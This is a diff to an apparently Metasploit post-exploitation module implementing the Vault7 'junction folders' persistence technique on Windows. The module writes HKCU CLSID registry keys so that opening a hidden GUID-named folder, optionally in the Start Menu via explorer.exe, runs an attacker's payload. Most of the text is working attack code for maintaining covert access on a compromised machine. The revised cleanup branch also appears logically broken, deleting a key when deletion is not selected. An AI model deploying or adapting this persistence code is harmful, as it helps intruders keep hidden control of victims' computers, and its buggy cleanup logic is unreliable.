@@ -14,7 +14,6 @@
 # POC: https://wikileaks.org/ciav7p1/cms/page_13763373.html
 #
 #
-#
 # [ DESCRIPTION ]
 # Implementation of vault7 junction folders persistence mechanism. A junction folder in Windows is a
 # method in which the user can cause a redirection to another folder, this module will add a registry
@@ -28,7 +27,15 @@
 # The full path of the appl to run or payload => set APPL_PATH C:\\Windows\\System32\\calc.exe
 # The full path and name of folder to create  => set FOLDER_PATH C:\\Users\\%username%\\Destop\\POC
 # Use explorer.exe to persiste your agent?    => set PERSIST_EXPLORER true
-# Delete malicious registry hive/keys?        => set DEL_REGKEY true
+# Delete malicious registry hive/keys (GUID)? => set DEL_REGKEY true
+# ------------------------------------------------------------------------------------------
+# The GUID to be deleted                      => set DEL_GUID 0fd30-5siO4-532a-4dte23
+# ------------------------------------------------------------------------------------------
+# WARNING: This post-exploitation module creates a GUID key to be used, and if the exploit
+# its active for days in target system and we need to return to it to delete it, then this
+# option will accept a GUI value to be inputed (we only need to use this option if we exit
+# 'juntion_shell_folders_persistence' module and need to return to it to delete persistence)
+# ------------------------------------------------------------------------------------------
 #
 #
 #
@@ -90,7 +97,7 @@ class MetasploitModule < Msf::Post
                 super(update_info(info,
                         'Name'          => 'vault7 junction folders [User-level Persistence]',
                         'Description'   => %q{
-                                        Implementation of vault7 junction folders persistence mechanism. A junction folder in Windows is a method in which the user can cause a redirection to another folder, this module will add a registry hive in 'HKCU\software\Classes\CLSID\{GUID}' and use sub-key '\Shell\Manage\Command' to execute our payload, then builds a Folder named Indexing.{GUID} under 'Start Menu\Programs\Accessories' (persistence).
+                                        Implementation of vault7 junction folders persistence mechanism. A junction folder in Windows is a method in which the user can cause a redirection to another folder. this module will add a registry hive in 'HKCU\software\Classes\CLSID\{GUID}' and use sub-key '\Shell\Manage\Command' to execute our payload (exploit demonstration mode) and it builds a folder name POC.{GUID} in sellected location that if open will trigger our application (payload). Check module ADVANCED OPTIONS to use the 'explorer persistence mechanism'.
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
@@ -100,7 +107,7 @@ class MetasploitModule < Msf::Post
                                         'special thanks: betto(ssa)',   # module debug help
                                 ],
  
-                        'Version'        => '$Revision: 1.1',
+                        'Version'        => '$Revision: 1.2',
                         'DisclosureDate' => 'jun 1 2018',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
@@ -132,13 +139,14 @@ class MetasploitModule < Msf::Post
                         [
                                 OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                 OptString.new('APPL_PATH', [ true, 'The full path of the appl to run or payload']),
-                                OptString.new('FOLDER_PATH', [ true, 'The full path and name of folder to create']),
+                                OptString.new('FOLDER_PATH', [ true, 'The full path and name of folder to create'])
                         ], self.class)
 
                 register_advanced_options(
                         [
                                 OptBool.new('PERSIST_EXPLORER', [ false, 'Use explorer.exe to persiste your agent?' , false]),
-                                OptBool.new('DEL_REGKEY', [ false, 'Delete malicious registry hive/keys?' , false])
+                                OptBool.new('DEL_REGKEY', [ false, 'Delete malicious registry hive/keys (GUID)?' , false]),
+                                OptString.new('DEL_GUID', [ false, 'The GUID to be deleted e.g: 0fd30-5siO4-532a-4dte23'])
                         ], self.class) 
 
         end
@@ -147,7 +155,6 @@ class MetasploitModule < Msf::Post
 
 def run
   session = client
-
 
     #
     # the 'def check()' funtion that rapid7 requires to accept new modules.
@@ -225,16 +232,22 @@ def run
     end
 
 
+      #
+      # GATHER INFO ABOUT TARGET SYSTEM .
       # store %AppData% directory full path ..
+      print_status("Retriving %AppData% full path ..")
+      Rex::sleep(1.0)
       data = client.fs.file.expand_path("%AppData%")
       # store username into a variable
-      print_status("Retriving target username ..")
+      print_status("Retriving target %username% ..")
       Rex::sleep(1.0)
       user_name =  client.fs.file.expand_path("%username%")
       # create new GUID and store it in a variable
       print_status("Creating new GUID key value ..")
       Rex::sleep(1.0)
       new_GUID = cmd_exec("powershell.exe -ep -C \"[guid]::NewGuid().Guid\"")
+      print_good("New GUID: #{new_GUID}")
+      Rex::sleep(1.0)
 
 
      #
@@ -248,15 +261,13 @@ def run
         '#{hive_key}\\#{new_GUID}\\InprocServer32 /v LoadWithoutCOM /t REG_SZ /d /f',
         '#{hive_key}\\#{new_GUID}\\InprocServer32 /v ThreadingModel /t REG_SZ /d \"Apartment\" /f',
         '#{hive_key}\\#{new_GUID}\\ShellFolder /v Attributes /t REG_DWORD /d \"0xf090013d\" /f',
-        '#{hive_key}\\#{new_GUID}\\ShellFolder /v HideOnDesktop /t REG_SZ /d /f',
-        'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
+        '#{hive_key}\\#{new_GUID}\\ShellFolder /v HideOnDesktop /t REG_SZ /d /f'
        ]
      else
-       print_status("Demo mode selected ..")
+       print_status("Exploit Demo mode selected ..")
        Rex::sleep(1.0)
        hacks = [
-        '#{hive_key}\\#{new_GUID}\\Shell\\Manage\\Command /ve /t REG_SZ /d \"#{app_path}\"" /f',
-        'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
+        '#{hive_key}\\#{new_GUID}\\Shell\\Manage\\Command /ve /t REG_SZ /d \"#{app_path}\"" /f'
        ]
      end
 
@@ -281,19 +292,17 @@ def run
          #
          # build POC folder (juntion shell folders)
          #
+         r=''
          if datastore['PERSIST_EXPLORER'] == true
-           r=''
            folder_poc ="\"#{data}\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\POC.#{new_GUID}\""
            print_status("Creating juntion shell folder ..")
            Rex::sleep(1.0)
-           print_warning("[Persiste In Explorer Sellected]")
            print_warning("DIR: #{folder_poc}")
            Rex::sleep(1.0)
            r = session.sys.process.execute("cmd.exe /R mkdir #{folder_poc}", nil, {'Hidden' => true, 'Channelized' => true})
            r.channel.close
            r.close
          else
-           r=''
            print_status("Creating juntion shell folder ..")
            Rex::sleep(1.0)
            r = session.sys.process.execute("cmd.exe /R mkdir \"#{fol_path}.#{new_GUID}\"", nil, {'Hidden' => true, 'Channelized' => true})
@@ -308,21 +317,48 @@ def run
        #
        if datastore['DEL_REGKEY'] == true
          r=''
-         print_status("Delete registry entry: #{new_GUID}..")
+         if datastore['DEL_GUID'] == 'nil'
+           print_status("Delete GUID regkey: #{new_GUID}")
+           Rex::sleep(1.0)
+           reg_clear = "#{hive_key}\\#{new_GUID} /f"
+           r = session.sys.process.execute("cmd.exe /R REG DELETE #{reg_clear}", nil, {'Hidden' => true, 'Channelized' => true})
+           print_status("Deleted: #{reg_clear}")
+           Rex::sleep(1.0)
+             if datastore['PERSIST_EXPLORER'] == true
+               folder_poc ="#{data}\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\POC"
+               print_warning("POC Folder needs to be deleted manually ..")
+               print_warning("DIR: #{folder_poc}")
+               Rex::sleep(1.0)
+             else
+               print_warning("POC Folder needs to be deleted manually ..")
+               print_warning("DIR: #{fol_path}")
+               Rex::sleep(1.0)
+             end
+             r.channel.close
+             r.close
+         end
+
+       else
+
+         del_guid = datastore['DEL_GUID']
+         print_status("Delete GUID regkey: #{del_guid}")
          Rex::sleep(1.0)
-         reg_clear = "#{hive_key}\\#{new_GUID} /f"
+         reg_clear = "#{hive_key}\\#{del_guid} /f"
          r = session.sys.process.execute("cmd.exe /R REG DELETE #{reg_clear}", nil, {'Hidden' => true, 'Channelized' => true})
          print_status("Deleted: #{reg_clear}")
          Rex::sleep(1.0)
            if datastore['PERSIST_EXPLORER'] == true
+             folder_poc ="#{data}\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\POC"
              print_warning("POC Folder needs to be deleted manually ..")
+             print_warning("DIR: #{folder_poc}")
              Rex::sleep(1.0)
            else
              print_warning("POC Folder needs to be deleted manually ..")
+             print_warning("DIR: #{fol_path}")
              Rex::sleep(1.0)
            end
-         r.channel.close
-         r.close
+           r.channel.close
+           r.close
        end
 
 
